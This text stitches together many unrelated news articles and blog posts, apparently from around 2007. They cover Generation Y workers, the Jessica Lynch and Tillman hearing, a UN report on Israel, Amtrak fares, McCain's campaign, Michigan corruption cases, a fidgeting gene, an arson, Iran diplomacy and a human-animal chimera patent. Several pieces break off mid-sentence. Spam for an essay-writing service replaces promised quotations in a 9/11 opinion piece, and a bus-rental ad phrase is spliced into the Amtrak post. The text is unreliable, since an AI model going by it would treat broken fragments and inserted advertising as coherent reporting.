The Department of Labor reports that from 2000 to 2010 there will be a 30 percent decrease of workers in their 30s and 40s .
In addition , many Generation X parents are choosing to leave the workforce or cut back on hours in order to be home with their children .
This trend is so pronounced that it ’s creating a shortage of managers already .
Many young people want their own businesses .
The barriers to starting an Internet business are low .
Viral marketing via a personal e-mail list and a few key mentions on prominent blogs can potentially catapult a good idea into a successful business .
Since young people can effectively fund their own companies this way , many do not want to pay their dues by working for someone else and learning the ropes .
The flexibility of owning a company is not only appealing , but also a way to avoid menial labor at the bottom of the corporate ladder .
In fact , many young people are choosing the excitement of entrepreneurship over the stability of a good salary .
If entrepreneurship is the first choice , a corporate job is a backup plan .
Matt Humphrey , 20 , and three friends just founded SlapVid , a company that cuts the cost of providing video content online .
Humphrey thinks of the MBA program he is now in as sort of a backup plan in case SlapVid does not take off at the end of the summer .
And in the event that he does not have another idea for a company before he graduates , getting a job at someone else ’s company is a second - level backup plan .
Parents are a safety net .
More than 50 percent of college graduates will move back home with their parents this summer .
And most parents will like it .
It used to be that returning home after college was seen as a sign of failure .
Today , however , economists and sociologists see such homecomings as a smart response to exorbitant housing prices in big cities , and entry - level wages that do not cover living expenses .
Three out of four of the founders of SlapVid are getting financial help from their parents .
And Humphrey ’s parents are typical in their enthusiasm for their child ’s adventure , and the tight relationship they share .
“ They know they might have to support me for longer than they planned for , ” Humphrey said .
“ They ’re definitely up for that .
If I want to do something really , really cool , they ’ll support me all the way .
They call me every day to see how I ’m doing . ”
With such parental support , there is no need for a company to play the parenting role , which is what happened when baby boomers entered the workforce .
And if there is no paternalism in corporate life , it becomes a scramble to figure out what businesses can leverage to scoop up young employees .
The intimidation factor is diminished .
“ People going to college today are working harder than I ever did in school , ” says Bill MacGowan , chief human resources officer of Sun Microsystems .
“ These kids will find work easier than I did . ”
In return for their effort , they expect to be well compensated by employers .
As consummate consumers , they use technology to customize the way they view information , and they expect the same kind of customization when it comes to selecting jobs .
They negotiate for vacation time , mentoring and training , flexible schedules , and even tricked - out laptops .
And when it comes to negotiating , young people assume the adults at the office are on their side .
Generation Y has been raised by parents who often acted more like friends and mentors .
In fact , often a wide community was involved in helping a Generation Y child succeed — including teachers , coaches , and private tutors .
As a result , young people bring unprecedented confidence to the negotiating table .
Some even have their parents in the room for added help , and many respected companies are willing to engage parents in the hiring process if that ’s what the candidate wants .
Indeed , the scales have tipped and young people are in charge .
For people who have been in the workforce for a long time and expected to be in charge , the new reality is difficult to accept .
But it ’s possible all employees will benefit from some of the changes .
After all , demands such as more flexible schedules , are appealing to all employees , regardless of age .
WASHINGTON , April 24 — House Democrats burrowed into the histories of Pfc. Jessica D. Lynch and Cpl. Pat Tillman in a hearing today , holding up the episodes as egregious examples of officials ’ twisting the truth for public relations in wartime .
They received help in making their case from witnesses who have mostly shied away from the spotlight , Ms. Lynch and Corporal Tillman ’s mother , Mary , and brother , Kevin , who enlisted in the Army along with him after the attacks on Sept. 11 , 2001 .
“ I am still confused as to why they chose to lie and tried to make me a legend when the real heroics of my fellow soldiers that day were , in fact , legendary , ” said Ms. Lynch , dressed in a brown pantsuit and speaking softly but firmly into the microphone as more than 12 photographers clicked away in front of her .
Accounts from officials of Ms. Lynch ’s bravery held the nation in thrall in the early stages of the Iraq invasion in 2003 after her maintenance convoy went astray near Nasiriya and she was taken prisoner .
After her rescue , which was made into a television movie , she disputed those who said she fought off Iraqi soldiers until she was captured .
She never fired a shot , she reiterated today .
A UN human rights investigator has likened Israel 's occupation of the Palestinian territories to apartheid South Africa and says there should be " serious consideration " over bringing the occupation to the international court of justice .
The report by John Dugard , a South African law professor who is the UN 's special rapporteur on human rights in the Palestinian territories , represents some of the most forceful criticism yet of Israel 's 40 - year occupation .
Prof Dugard said although Israel and apartheid South Africa were different regimes , " Israel 's laws and practices in the OPT [ occupied Palestinian territories ] certainly resemble aspects of apartheid . "
His comments are in an advance version of a report on the UN Human Rights Council 's website ahead of its session next month .
After describing the situation for Palestinians in the West Bank , with closed zones , demolitions and preference given to settlers on roads , with building rights and by the army , he said : " Can it seriously be denied that the purpose of such action is to establish and maintain domination by one racial group ( Jews ) over another racial group ( Palestinians ) and systematically oppressing them ?
Israel denies that this is its intention or purpose .
But such an intention or purpose may be inferred from the actions described in this report . "
He dismissed Israel 's argument that the sole purpose of the vast concrete and steel West Bank barrier is for security .
" It has become abundantly clear that the wall and checkpoints are principally aimed at advancing the safety , convenience and comfort of settlers , " he said .
Gaza remained under occupation despite the withdrawal of settlers in 2005 .
" In effect , following Israel 's withdrawal , Gaza became a sealed - off , imprisoned and occupied territory , " he said .
Prof Dugard said his mandate was solely to report on human rights in the occupied Palestinian territories and he described as a violation of international humanitarian law the firing of rockets by Palestinians from Gaza into Israel .
" Such actions cannot be condoned and clearly constitute a war crime , " he said .
" Nevertheless , Israel 's response has been grossly disproportionate and indiscriminate and resulted in the commission of multiple war crimes . "

In Mike ’s post about Amtrak , it was suggested in the comments that if we lost passenger rail , we ’d be stuck with buses .
So what ?
They ’re far cheaper than Amtrak , and they ’ll often get there faster !
I wrote the below post back in April 2006 ( so the costs might not be up to date ) , and added a little below this .
— — — ——
The railroads are tremendously important to this country for shipping goods , but there are much easier and cheaper ways to travel as a passenger .
As a quick test , I looked up train fare from Atlanta to Chicago .
Since I regularly travel there to see family , I wanted to see how it compared to airfare .
Well , Amtrak does n’t run a direct route between the two .
So a round - trip ticket cost about $ 380 , with a stop each way in Washington , DC .
And due to the extra time of those trips , the total travel time was about 30 hours each way .
Compare that to an airline flight .
The same trip , by air , costs about $ 200 and takes about 2 hours each way .
Hell , to get to Chicago is only about a 11 - 12 hour DRIVE , and would n’t cost more than about $ 100 in gas each way .
I even checked Greyhound , and it was about a 15 - hour trip , at a cost of $ 130 round - trip .
Of course , I ’m sure I can be accused of cherry - picking the data with an Atlanta ->
Chicago trip , however , some people may prefer using bus companies like this one for these trips .
I ’m sure some other routes are more competitive in cost .
In all honesty , it was simply the first choice I thought of , as it ’s two major cities I ’m familiar with for both auto and air travel .
But if you ’re going to offer intercity travel , without any direct service between the largest city in the Southeast and the largest city in the Midwest , are n’t you shooting yourself in the foot ?
It ’s very simple .
For any long trip , it ’s much more worthwhile to fly .
For shorter trips , though , it might be profitable and convenient …
IN WHICH CASE PRIVATE ENTERPRISE CAN TAKE CARE OF IT .
And where rail lines are n’t available , bus service is .
There is absolutely no reason that American taxpayers need to continue wasting money on passenger rail service .
If Amtrak ca n’t get themselves to profitability , it ’s time for them to disappear .
— — — ——
In addition , I tried to run a different experiment .
Going 1 - way from Atlanta to Los Angeles , Amtrak ’s cheapest route takes 74 hours , and came in at $ 382 , traveling through Washington , DC and Chicago , IL in the process .
Greyhound takes about 47 hours , and costs $ 120 .
By choosing Greyhound , you save an entire day of travel time and over $ 250 .
Lest you think I ’m deliberately choosing Atlanta , I decided to pick a one - way trip between Chicago and Los Angeles , one of the few routes where the rail lines are direct .
Surely rail is cheaper and much faster than bus service , right ?
Amtrak is 43 hours , $ 218 .
Greyhound is 44 hours , $ 120 .
You burn an extra hour ( assuming Amtrak is on time , which is rare , and save nearly $ 100 .
This means that if a group of you are planning a trip by train , it is probably both cheaper AND faster to get coach bus rental chicago rather than rely on Amtrak and their dodgy time schedule .
A bus service is more flexible and cheaper than Amtrak .
The infrastructure they roll on ( the roads ) allows for much more freedom of route service than the rail .
On most routes , they will provide more competitive prices and actually get you there faster than Amtrak .
Why do we continue throwing money after passenger rail ?
McCain could pull out of race by September , UK paper asserts RAW STORY
Published : Monday June 25 , 2007 Print This Email
This A Sunday report by one of Britain 's best political reporters in Washington posits that Sen. John McCain ( R - AZ ) is on his last legs and may abandon his bid for the presidency as soon as September " if his fundraising dries up and his poll ratings continue to drop . "
McCain 's staff vigorously denied the allegation .
" He 's a battler , so I 'd expect him to carry on , but everyone is waiting to see what his new fundraising totals are , " Arizona Republican Party Chairman Randy Pullen told the Sunday Times ' Sarah Baxter .
" That 's pretty critical .
If he does n't have the money , he wo n't be able to run . "
Pullen also delivered another devastating blow , saying he believed that McCain could lose his home state of Arizona .
" It looks to me like Arizona will be in play , " Pullen said .
" The immigration issue is clearly hurting him with the base of the party . "
The communications director of McCain 's 2000 campaign told Baxter it's " possible "  that he could drop out : " There are all sorts of challenges McCain is facing , from fundraising to Fred Thompson and the Iraq war , but the biggest single boulder in his path is the immigration issue . "
One veteran Republican consultant told the Sunday Times he thought the odds of McCain remaining in the race beyond autumn were 3 - 1 against .
" He 'll be gone by September , " predicted Tom Edmonds .
" The wheels are coming off his wagon and it's hard to see how he can recover .
He wo n't be able to pay all the good talent he has hired and they 'll want to drift away from a loser . "
Recent polls have McCain far behind the money he'd been able to raise early in the raise .
A Rasmussen Reports poll last week , Baxter notes , showed McCain third behind Mitt Romney , the Mormon former Mass .
governor , with just 10 percent of Republican voters ; a second poll in Iowa , a crucial primary state , put McCain in fifth place behind Mike Huckabee with only six percent .
A McCain insider gave the battle - tested quote of veteran campaign communications directors : " Reports of his death are greatly exaggerated .
We 're in the pre-campaign phase when everybody is trying hysterically to read the tea leaves , but after September the lights will go on and everybody will see that we 've got a candidate who has stood before , does n't need on - the - job training and has the resources to compete . " 
Still , Baxter notes that McCain 's political carapace could keep him in the race , even if he no longer stands a chance of winning .
He could also face further trouble if newly registered independent Michael Bloomberg enters the fray .
Read Baxter 's Sunday Times report here .
In Eastern Michigan since 2001 , at least 21 Democratic public officials have been charged or linked to corruption inquiries , including the governor , the mayor of Detroit and several local officials , including Mr. Marlinga .
Officials at the United States attorney ’s office in Detroit identified one Republican who had been charged and said they did not have a list by party that would allow them to identify others .
Some of those Michigan cases resulted in convictions on significant charges .
They included a member of the Pontiac City Council who pleaded guilty to taking a bribe from F.B.I. agents posing as local businessmen , a Detroit councilman convicted of fraud , and a former Wayne County official convicted of accepting gifts from a Detroit airport contractor .
On the other hand , several cases resulted in acquittals or no charges being filed , or convictions on relatively minor offenses .
A Wayne County lawyer who pleaded guilty in 2004 to a misdemeanor charge , for example , used an intern to enter data on potential Democratic political donors for the pending governor ’s race .
In Mr. Marlinga ’s case , the State Republican Party and his Republican opponent in the House race filed complaints asking for an investigation .
The charges centered on a legal motion by Mr. Marlinga , while serving his fifth elected term as county prosecutor , to the State Supreme Court in 2002 agreeing that it should re-examine a decade - old rape case .
He had doubts about the case because an orthodontist who had appeared as an expert witness — testifying that there was at least a 3 million to 1 chance that a bite mark on the victim came from someone other than the suspect — had since been discredited .
A second expert witness had recanted her testimony .
The testimony was crucial to the prosecution , and Mr. Marlinga said he felt morally obligated to notify the Supreme Court of his doubts .
The convicted man was later acquitted , after the Supreme Court agreed that he should be retried .
But Mr. Marlinga ’s request to review the case nearly ended his career as a lawyer .
Several days before he filed it , he attended a holiday party where he solicited campaign contributions for his Congressional race , including a $ 2,000 donation from a real estate agent who employed the sister of the convicted man .
Mr. Marlinga knew that the real estate agent — who had no financial or family relationship with the rape suspect — believed that the man deserved a new trial .
Mr. Marlinga said he saw no issue with accepting the donation , because he had decided months earlier to file the brief .

The full genetic picture on obesity is not complete , researchers say
Mice with the code are more likely to be primed athletic beasts , while those without laze around getting fat .
It is the second time in recent months scientists have claimed to have located genetic material linked to body weight .
Scientists in Britain said they had found a separate gene , dubbed the fat gene , linked directly to obesity .
Environmental factors
Are you the type of person who is constantly fidgeting - playing with pencils and pieces of paper , your legs jumping around under the office desk as you type ?
If you are there is a chance fidgeting may be in your genes - and the good news is that you are less likely to be fat , according to the new research .
We 're spending energy by [ fidgeting ] and this is of course one of the key factors in energy balance
Prof Mathias Treier
The scientists , whose work appears in the journal Cell Metabolism , found a slice of their genome they say accounts for the propensity to shuffle and shift .
The researchers say humans have the same genetic switch shown in the mouse that pre-disposes some to fidgeting .
Lead researcher Professor Mathias
Treier says those who do fidget are getting valuable daily exercise even without knowing it .
" We 're spending energy by doing that - and this is of course one of the key factors in energy balance , " he says .
" Clearly people who have the more fidgeting phenotype are more protected against diet - induced obesity , for example , than people who are more calm . "
The way this genetic mechanism works is complicated and not fully understood - although the researchers believe this fidget molecule is also involved in appetite and our natural urge to go out and hunt down our next meal .
The UK scientists who tracked the " fat gene " said at the time it was likely to form just one part of the overall genetic profile of obesity .
Professor Treier also believes the full genetic picture is still to be completed .
He says we cannot dismiss environmental factors behind body weight .
In the final reckoning , diet and exercise are likely to be just as important as any genetic pre-disposition to weight gain .

Online flamewars certainly can get nasty at times , often boiling over into quite a bit of rage -- but it 's still pretty rare ( and amazing ) to see that anger then boil over into the real world .
Last year , we wrote about a case in the UK where someone drove 70 miles to attack the guy he was sparring with online .
The press referred to it as " web rage , " though , rage does n't tend to last that long .
Or , perhaps it does .
Here in the US we do things in bigger ways , apparently .
A guy in Virginia who got into a flamewar online decided to make it a bit more literal , and drove 1,300 miles to Waco , Texas to burn down the home of one of this online enemies from a ( no , this is n't a joke ) picture sharing community .
Not only that , but the attacker took photos of each " Welcome to State X " signs and shared them online as he made his way across the country -- to let others in the community know he was serious about going after the other guy .
What did the one guy do to piss the other guy off ?
Apparently he had different political viewsposted a silly photo claiming the other guy was a nerd .
Nerd or not , he 's now a convicted arsonist .
He 's been sentenced to 7 years in prison for burning down the other guy 's home -- but it does n't sound like the intervening time or pending jail time cooled this guy down .
As the sentencing was happening , the arsonist used his cameraphone to take snapshots of the guy whose home he tried to burn down , apparently to post online as well ( though , the court ordered the photos destroyed ) .
So , while the typical admonition to those engaging in flame wars is to remember that it's a real person on the other side , we 'd also like to add " who may be so crazy that they 'll come burn down your house . "

I recently discussed American foreign policy with an attorney over lunch .
Over the years , this fellow had generally shown himself to be thoughtful on many issues .
He is a meticulous lawyer , charged with parsing out bits of relevant evidence regarding the dozens of cases on which he works every day .
It eventually became clear that he fully supported the U.S. attack on Iraq , though he was agonized over how badly the “ war ” was going .
Why did he support the Iraq invasion ?
This is where the conversation got strange : Because of what “ they ” did to us ( allegedly the 9/11 attacks ) .
It ’s because of what “ they ” planned to do ( impose Muslim culture on all Americans ) .
It ’s because of what “ they ” stand for ( “ they hate freedom ” ) .
Further , we simply need to make them pay .
We ca n’t let “ them ” get away with what “ they ” did on 9/11 .
It became clear through this conversation that , for my acquaintance , all Muslim countries are the same .
None of them can be trusted .
All of them are at least somewhat guilty for 9/11 .
I challenged his over - generalizations , but my acquaintance would not back off .
For him , all Muslims are bad .
Further , it was clear to him that we could n’t do nothing about 9/11 .
Doing something ( no matter what it was ) is far better than doing nothing .
It has repeatedly occurred to me that without the federal government ’s 6 - year national license to engage in bigotry and misdirected vengefulness , the invasion of Iraq would have been extremely difficult to sell .
Based upon numerous conversations I ’ve had with people who supported the Iraq invasion , bigotry and misdirected vengefulness justified their support of the invasion .
For many people these things continue to justify any future U.S. military action in the Middle East .
“ They ” have it coming .
In “ The Real Lessons of 9/11 , ” Gary Kamiya does a much - needed psychological analysis on those people who have supported the sustained and misdirected U.S. military violence in the Middle East .
Kamiya has really thought things through .
Kamiya ’s Salon.com article is an extraordinary piece of writing .
The bottom line is that the mainstream media has not questioned the shameful emotions and ideology that justified Bush ’s crusade in the minds of all too many people .
Here are a few excerpts from the article , but I highly recommend clicking on the link and reading the whole thing :
Always Proof Your Work
An essay help service can give you support for proofing your essay if needed .
This is vital for a scholarship essay as a reader who finds significant proofing errors will think you are not taking your work all that seriously .
This would only hurt your chances for success in most cases .
Show Strong Interest Many “ write my essay ” plans fail because people do not show any real interest in what they are doing .
They just focus more on writing things because they feel a real obligation for doing so .
This will only hurt as it shows a person is not all that interested in whatever the subject matter of the essay is .
When you look to write essay thesis , you have to plan something based on what you are interested in and how it will work for you .
Avoid anything that is tough for you to work with but you feel a need to handle just because it ’s an obligation to you .
This part of essay writing help will save you from undue stress as you will instead be writing something that you will actually want to work on .
Create a Good Point Every essay needs to have a sensible point .
The best essay writing service you can hire knows that every paper you wish to work with needs to have a point that focuses on something useful and of real value .
The point you will bring up must be introduced early on and should be referenced throughout your work with as much supporting material as possible .
Readers will not want to look at your essay if it just drones on and does not focus on anything of value .
Keep it all about something of value and let the reader know how committed you are to getting the paper to read well and to be about something of real use .
Do n’t Be Redundant
The final point to see when writing your paper entails the conclusion .
It is fine to offer a brief summary , but the best essay service knows that a conclusion must not be redundant .
It needs to at least offer a new perspective of what you are writing about .
Many essay writing service reviews often recommend that people add their own values on what they have learned and what they can do when thinking about the future .
The greater Manchester police want everyone to help them find terrorists :
In a new anti-terror drive , a tip - off hotline is being relaunched and an advertising campaign will urge people to report any suspicious behaviour .
It asks :
* Do you know anyone who travels but is vague on where they ’re going ?
* Do you know someone with documents in different names for no obvious reason ?
* Do you know someone buying large or unusual quantities of chemicals for no obvious reason ?
* Handling chemicals is dangerous , maybe you ’ve seen goggles or masks dumped somewhere ?
* If you work in commercial vehicle hire or sales , has a sale or rental made you suspicious ?
* Have you seen someone with large quantities of mobiles ?
* Have you seen anyone taking pictures of security arrangements ?
* Do you know someone who visits terrorist - related websites ?
* Have you seen any suspicious cheque or credit card transactions ?

US / E.U. plan to database airline passengers ' personal information raises deep privacy concerns Nick Langewis
Published : Sunday July 29 , 2007
Print This Email This While Homeland Security Secretary Michael Chertoff calls it " an essential security measure , " worries arise about a looming privacy threat in the new agreement between the United States and the European Union , effective August 1 , 2007 , that allows the United States to keep extensive profiles of inbound airline passengers .
In addition to data such as name , address , flight itineraries , and credit card information , the United States will now database more intimate details about passengers as provided by airlines , such as race , political opinions , religious beliefs , and sexual orientation .
Personal data received , even on people not under suspicion , is to be kept on file for fifteen years and only used " when lives are at risk , " such as during a terror investigation .
" We 're going to be able to connect the dots more quickly , " says Russell Knocke of the US Department of Homeland Security , " and we 're going to be able to provide our front line personnel with a powerful tool that really can help to save lives . "
Jim Dempsey of the Center of Democracy and Technology worries about how the information will be used , especially in cases of abuse and false accusations .
" This is part of a broader trend of the government building databases on the ordinary , lawful activities of ordinary , law - abiding people , " laments Dempsey .
Passengers will have the right to see the information , and there will be avenues to correct anything that needs to be corrected " in hopefully just a few months , " says CNN 's Kathleen Koch .

In high school I overheard some adults talk about leadership .
It was repulsive .
The words “ power ” and “ ego ” would have fit right in .
In the years since I ’ve learned something about true leadership :
It ’s rare .
Like the demotivator reads : “ Leaders are like Eagles .
We do n’t have either of them . ”
Here are some hints on becoming a * REAL * leader .
1 ) Grab a Vision –
It does n’t have to be original with you , but it has to be significant and you have to believe in it .
Work on it .
Develop it .
Stick with it .
Great leaders use momentum to build their vision .
The clarity of a real leader ’s vision grows with time .
2 ) Carry the Cost – People wo n’t follow a leader who does n’t invest in a vision .
Not just money , but time , energy and commitment .
Great leaders like Dr. Martin Luther King Jr. and Nelson Mandela were willing to rot in jail rather than compromise on their vision .
People do n’t want to be “ used ” by some ego deprived flunky , but they will flock to committed leaders who will pay the cost of leading the charge for change .
3 ) Share the Reward – The reward of leadership is not power , but a fulfilled vision .
Thanking followers can erode power , but popularizes the vision .
Reward followers as often ( and publically ) as possible .
Following these steps will put you well on the road to becoming a powerless leader .
A leader people follow because they want to , not because they have to .
The Irony : Powerless leaders are never short of power .

AIX-EN - PROVENCE , France — Jacques Souquet had gone through several start - ups in Seattle , but he still was not entirely prepared for beginning a high - tech company in his native France .
Failure is still a no - no here , creating a challenge for any start - up .
Not to mention the idea that difficulty here seems a contradiction in terms for , after all , the word “ entrepreneur ” is French .
And Mr. Souquet , 58 , a compact man with a gentle manner , has a lot of rules to learn .
When he once had to meet a deadline , he asked his colleagues to come in on a Sunday , which they did ; but Mr. Souquet got a scolding from his lawyer , who lectured about the legal limits on the French workweek .
Now , Mr. Souquet ’s company is up and running smoothly , and that is a testimony to recent changes in France and greater Europe : start - ups are no longer rare .
Moreover , Europe ’s new entrepreneurs are turning

Jex concealed the sex toy in a carrier bag , pretending it was a gun
Nicki Jex , 27 , of Braunstone , Leicester , hid the sex toy in a carrier bag pretending it was a gun , Leicester Crown Court heard .
The manager at Ladbrokes in Narborough Road handed over more than £ 600 in cash when he pointed it at her on 27 December 2006 , the court heard .
On Monday , Jex , who pleaded guilty to robbery , was jailed for five years .
Sentencing him , Judge Philip Head said : " It 's right to record that you did not have a firearm but you pretended you had and intended that those you confronted believed that you did , and it must have been truly terrifying for them at the time . "
The robbery was captured by CCTV inside the shop .
' Considerable courage '
As Jex left with more than £ 613 in till contents and other money , he was followed outside by the shop 's last remaining customer Wayne Vakani the court heard .
" The defendant pointed the vibrator in the bag at Mr Vakani and warned him to back off , " said Tim Palmer , prosecuting .
" Mr Vakani then kept a discreet distance but kept an eye on the defendant and watched where he went . "
The court heard that it was thanks to this customer that the defendant 's hat , worn during the robbery and containing his DNA , was discovered nearby .
Initially Jex denied any involvement but later changed his plea .
He was a drug addict with a string of previous convictions dating back to February 2002 , the court heard .
In mitigation , Phil Gibbs , defending , said Jex , a qualified chef and engineer , had a " fragile " state of mind .
He told the court : " One can be thankful that the item he had was n't a firearm .
" Frankly , he did n't care less what happened to him at that time .
He was falling into the abyss and that 's the root cause of drugs . "
Mr Vakani was awarded £ 500 by Judge Head for his " very considerable courage " .
For most Americans , who now wish we had never invaded Iraq , the notion of expanding that extraordinarily lethal mistake into neighboring Iran and Syria must seem insane .
Yet those same brilliant neoconservative strategists who brought us the war in Iraq and constantly urge its escalation exist in their own special reality .
They speak of military hostilities against Iran and Syria with anticipation rather than apprehension .
As we should have learned over the past four years , their dreams often turn out to be our nightmares .
For four brief hours on Memorial Day , however , the neoconservative drive toward a wider conflagration in the Middle East stalled , when ambassadors from the United States and Iran met in Baghdad .
That meeting ’s historic significance should not be underestimated , even though U.S. officials emphasized that no further meetings would necessarily occur .
Convened under the auspices of the Iraqi government , the Monday encounter represented the first substantive bilateral discussion between American and Iranian officials in three decades .
Relations with Iran have been poor ever since the mullahs seized power from the U.S. - sponsored shah in 1979 , but in recent months the increasing strains between us and them have brought armed conflict closer .
Longstanding grievances against Iran ’s sponsorship of terrorism in the region have been exacerbated by the prospect of an Iranian nuclear arsenal and allegations about Iranian agents supplying weapons to the insurgents in Iraq .
As these problems worsened , American policy toward Iraq has vacillated between “ containment ” and “ regime change , ” with applications of economic sanctions and threatening rhetoric — and not much success .
Iran has become more aggressive and more influential in the region as a direct consequence of the violent regime change that we inflicted on Iraq .
Over the same period , Iran has elevated leaders such as Mahmoud Ahmadinejad , who are more religiously conservative and more hostile to the United States and its allies , especially Israel .
What we have not tried , until now , was talking with the Iranian leaders .
By breaking that taboo , the Memorial Day meeting pointed toward a saner policy — just as the Iraq Study Group urged six months ago , when its report highlighted the need for regional talks including Iran and Syria .
Naturally , such signs of sanity were immediately met with furious denunciations that echoed the shrill attacks on House Speaker Nancy Pelosi , who dared to visit the Syrian leadership in Damascus .
When the Pelosi trip was followed by overtures from Secretary of State Condoleezza Rice to both the Syrians and the Iranians , it signaled that U.S. policy - makers were considering a sensible shift .
Rice ’s exploratory gestures provoked angry editorials in The Weekly Standard and The Wall Street Journal , which accused the State Department of undermining the White House “ strategy for victory ” in the Middle East .
The real danger is that whenever we start talking with our enemies , we may discover potential areas of compromise or even agreement .
Progress would undermine the arguments of politicians and pundits who prefer permanent war .
But we already know that both Syria and Iran have cooperated with us in the past when they believed that their interests coincided with ours .
In the aftermath of 9/11 , the Syrians were obliging enough to accept a Canadian citizen whom we deported , and to torture and interrogate him on our behalf .
( Unfortunately , he was innocent . )
Meanwhile , the Iranians helped in western Afghanistan when the U.S. and its allies overthrew the Taliban .
There is no reason to exaggerate those exceptions — or to pretend that the Iranian and Syrian regimes are anything but deplorable .
Yet it is also true that those governments and the societies they control are more complex than our warmongers would tell us .
Close observers of Iran , for instance , believe that our threatening attitude actually weakens the democratic forces in their struggle with the mullahs — and that improved relations would strengthen reformers .
Would negotiations with the Iranians or the Syrians today lead to any worthwhile result ?
Our friends and allies in the Iraqi government — whose survival we have ensured with American lives and dollars — certainly think so .
The Iraqi diplomats talk with their counterparts in Damascus and Tehran every day .
Those facts wo n’t dissuade the neoconservatives from maligning any gestures toward realism .
They continuously seek to stir hysteria about Iran and to discredit any diplomatic and political alternatives to military action .
We are still living with the terrible consequences of the last great neoconservative triumph — namely the war in Iraq — and the enhanced power that their errors have bestowed so ironically on Iran .
In coping with that reality , it is long since time that we learned to ignore their bad advice .

This guy seems great until 16 seconds in :
For those of you who do n't know I watch commercials for a living .
I 'm not a political expert by far , but I can't believe that with all of the serious problems our nation is facing religion in schools is still an issue .
I believe that there 's a separation of church and state , and that teaching religion in schools goes against one of the basic rights we have as Americans , whether its " voluntary " or not .
This issue pisses me off very much .
Lets get the troops home to their families , and get the economy back up to snuff , maybe then we can argue about where religion belongs and who gives the best blow jobs .

Revitalization San Jose , Then and Now By Ryan McGreal
Published January 26 , 2007
I just came across an eye - popping before - and - after photo tour of downtown San Jose , California .
Near the epicentre , both physical and temporal , of 20th century automobile sprawl , San Jose in 1975 was a motorist 's dream , featuring wide , one - way streets , abundant parking , and flat , horizontal malls .
Little money or space was wasted on such ephemera as trees , and pedestrian infrastructure and public transit appears to have been marginal or non-existent .
Fast forward to 2005 , and the downtown is transformed into a dense , tree - lined , well - framed people place .
Streets are narrower , sidewalks are wider , light rail trundles along thoroughfares , surface parking lots are filled with destinations , and some streets are closed to automobiles altogether and turned into pedestrian plazas .
The difference is remarkable and needs to be seen to be appreciated .
Before : cars dominate this street
After : the street is now a classic people place
Please do click through and look at all the photos .
The transformation of sprawling thoroughfares into lush urban streetwalls is remarkable , and an inspiration for what Hamilton could look like in the near future .
Ryan McGreal , the editor of Raise the Hammer , lives in Hamilton with his family and works as a programmer , writer and consultant .
Ryan volunteers with Hamilton Light Rail , a citizen group dedicated to bringing light rail transit to Hamilton .
Ryan wrote a city affairs column in Hamilton Magazine , and several of his articles have been published in the Hamilton Spectator .
His articles have also been published in The Walrus , HuffPost and Behind the Numbers .
He maintains a personal website , has been known to share passing thoughts on Twitter and Facebook , and posts the occasional cat photo on Instagram .

of patents had done in the 200 - year history of America ’s oldest government agency .
He stepped before

No half - human “ monsters ”
would be patented , Lehman declared angrily , or any other “ immoral inventions . ”
Legal scholars — accustomed to an office bound by statute to remain silent until patents are approved or rejected — were shocked .
Forgoing the traditional 18 - month review period , Lehman had issued a marching order to his staff to reject a patent application
they had barely read , rather as if a judge had instructed a jury that the defendant was guilty before the trial began .
Furthermore , to support his decision , Lehman cited an 1817 court ruling that excluded
inventions “ injurious to the well - being , good policy , or good morals of society . ”
But patent law had long since been amended to say that if an applicant could claim constructive use for a patent ,
he or she could not be denied simply because there might be dangerous or unethical uses of the invention .
“ Even attorneys who worshiped the system were horrified , ” recalls
former patent examiner Peter di Mauro , who has since left the agency .
Research biologists and biotech executives also felt blind - sided , hearing in Commissioner Lehman ’s outburst a threat to the hard - earned clearance they had won from the Supreme Court 18 years earlier to patent “ anything under the sun made by man ” — even living organisms .
Strange as it may seem , the inventor , Dr. Stuart Newman , a soft - spoken developmental biologist and professor at New York Medical College in Valhalla , New York , completely agreed with Lehman that his invention defied the boundaries of human morality .
It ’s why he filed
for the patent .
And it ’s why , six years later , as the biomedical community holds its breath , he and the Patent Office remain locked in a legal battle that may redefine what we mean by “ human . ”
Newman ’s patent application is for an intriguing biotechnological contrivance called a chimera [ ki- mir -a ] .
According to Greek mythology , a chimera was a part- lion , part - goat , part - serpent creature that terrorized Lycia until it was slain by the hero Bellerophon .
If biotech continues to run amok , warns Newman , such inventions of legend and allegory could actually be invented .
Created by injecting the embryonic stem cells of one or more species into the embryo of another species and then allowing that embryo to continue development in the womb of either species , a biological chimera is a way to hybridize two or more species that wo n’t
cross sexually .
The exact results are largely unpredictable except for the certainty that the chimera will contain cells of each species proportionate to the numbers placed in the embryo .
A
creature made from an equal number of cells from two species could look like one species but contain the genes , organs , and intelligence of the other .
Newman seeks to patent “ chimeric embryos and animals containing human cells . ”
And while his application cites innocuous biomedical uses for human / animal chimeras — such as toxicological research and the potential for growing rejection - proof human organs in pigs or other creatures — taken to its most extreme but not necessarily impossible end , the technology could be used to manufacture soldiers with armadillolike shielding , quasi - human astronauts engineered for long - range space travel , and altered primates with enough cognitive ability to ride a bus , follow basic instructions , pick crops in 119 degrees , or descend into a mine shaft without worrying their silly little heads about inalienable human rights and the resulting laws and customs that demand safe working conditions .
At first blush , what Newman seeks sounds quite like many patents already
obtained by university laboratories and biotech corporations to insert human genes into mice
and other mammals , creating what is known as a “ transgenic ” animal .
But cross-pollinating using
whole cells containing the entire genomic sequence is a profoundly different and even more morally
charged process , and Newman ’s invention presents the Patent Office with a serious legal and political
quandary that could earn the agency enemies either way it might rule .
Granting a patent for a half - human
chimera would throw religious , bioethical , animal - rights , and constitutional activists into
high dudgeon .
And the biotech industry would boil over the approval of what is clearly a preventive
patent .
But decline it and the agency is in court , eventually the highest court in the land .
The last
time that happened the Patent Office lost its case .
Thus far , however , Commissioner Lehman and
his successors have decided that foiling Newman is worth the risk .
And Newman , a man accustomed to disappointing reversals in and outside
his laboratory , has fought back , claim by claim , for six years , because he knows that with a patent
in hand he can delay what he regards as a deeply offensive technology for the 20 - year life of the patent .
Opposed to genetically altering human beings and patenting living organisms , Newman ( who ’s supported
in this endeavor by techno - gadfly Jeremy Rifkin ) sees in the chimera the manifestation of all he
finds immoral about biotech .
The technology exists to make chimeric embryos “ tomorrow , ” he says ,
and a chimera of two similar species ( say human and chimp ) that could survive into adulthood probably
is n’t far off .
“ This is the prize .
The more you can humanize animals genetically , the better they
are for research models and as sources of transplantable tissues . ”
With such goals in mind , six Canadian and American biologists gathered
November 13 , 2002 , at the New York Academy of Sciences to debate in private whether or not to proceed
with chimeric research involving human cells .
While two of the scientists raised questions about
the ethics of such research , the rest felt that while it could admittedly lead to outcomes “ too horrible
to contemplate , ” chimeras still offered enough medical promise to proceed .
Dr. Newman has since
notified all six that if they proceed in developing chimeras , they will be in violation of his pending
patent , and litigation will follow .
